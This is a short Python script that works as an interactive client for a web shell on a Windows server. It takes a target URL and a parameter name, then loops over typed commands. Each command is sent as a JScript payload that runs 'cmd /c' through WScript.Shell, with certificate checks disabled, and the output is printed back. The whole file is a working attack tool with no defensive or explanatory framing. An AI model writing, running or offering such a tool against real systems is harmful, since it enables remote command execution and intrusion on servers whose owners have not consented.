import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
url = sys.argv[1]
code = sys.argv[2]
try:
	while True:
		cmd = input('CMD: ')
		shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(code,cmd)
		shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=10)
		print(shell_req.text.split('Name                            :')[0])
except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
	exit(0)
except KeyboardInterrupt:
	exit(0)